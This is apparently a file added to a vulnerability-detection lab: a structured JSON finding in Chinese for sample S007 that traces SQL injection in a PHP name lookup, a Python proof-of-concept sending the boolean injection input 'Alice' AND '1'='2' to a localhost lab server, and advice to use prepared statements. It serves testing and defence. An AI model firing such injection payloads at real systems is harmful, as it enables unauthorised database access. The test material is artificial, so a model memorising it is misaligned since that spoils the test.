@@ -1,0 +1,72 @@
+```json
+{
+  "sample_id": "S007",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0008",
+    "F01:0011",
+    "F02:0007",
+    "F02:0008"
+  ],
+  "evidence": {
+    "source": "F01:0008 从 $_GET['name'] 直接读取外部输入，未做类型或白名单限制。",
+    "flow": "F01:0011 将 $name 传入 find_people_by_name；F02:0007 将 $name 直接拼接到 SQL 字符串中。",
+    "guard": "无效：未使用预处理绑定、转义或白名单；$name 被放入单引号字符串并成为 SQL 结构的一部分。",
+    "sink": "F02:0008 调用 $db->query($sql) 执行拼接后的 SQL。"
+  },
+  "prerequisites": [
+    "PHP 8.5 本机服务监听 127.0.0.1:4280",
+    "入口 http://127.0.0.1:4280/lab_cases/S007/index.php 可访问",
+    "共享 bootstrap 已建立 $db 的 mysqli 连接且字符集为 utf8mb4",
+    "lab_people 表存在并含 id=1 name=Alice、id=2 name=Bob、id=3 name=Carol"
+  ],
+  "missing_context": [
+    "common/db_connect.php 未在片段中提供，但运行上下文声明连接由 bootstrap 建立",
+    "未提供 Web 服务器错误日志的具体路径"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "在可访问 127.0.0.1:4280 的本机运行 python3 s007_poc.py。脚本先请求 name=Alice 作为普通输入，再请求 name=Alice' AND '1'='2 作为不修改数据的测试输入。成功判据不是 HTTP 200，而是普通响应包含 ID 1 和 Alice，测试响应不包含该结果行，说明查询条件被注入改变。失败时检查 4280 端口服务、入口路径、db_connect.php 加载及 lab_people 初始化。"
+}
+```
+
+```python
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S007/index.php"
+
+
+def fetch(name: str) -> str:
+    url = BASE + "?" + urllib.parse.urlencode({"name": name})
+    with urllib.request.urlopen(url, timeout=5) as resp:
+        return resp.read().decode("utf-8", "replace")
+
+
+def main() -> None:
+    normal_input = "Alice"
+    test_input = "Alice' AND '1'='2"
+
+    normal_resp = fetch(normal_input)
+    test_resp = fetch(test_input)
+
+    print("普通输入响应片段：")
+    print(normal_resp[:800])
+    print("\n测试输入响应片段：")
+    print(test_resp[:800])
+
+    normal_ok = ("ID 1" in normal_resp and "Alice" in normal_resp)
+    test_changed = ("ID 1" not in test_resp and "Alice" not in test_resp)
+
+    if normal_ok and test_changed:
+        print("\n[观察] 普通输入返回 Alice 行，测试输入未返回该行；结果条件发生变化。")
+    else:
+        print("\n[未确认] 未观察到预期差异，请检查服务监听、入口路径、bootstrap 连接和 lab_people 初始化。")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+防护建议（非已验证修复事实）：将 name 作为绑定参数传给预处理语句，例如 WHERE name = ?，不要拼接 SQL；若存在动态列名、排序表达式或 IN 列表，应使用白名单或专用参数构造，不能仅依赖引号转义。
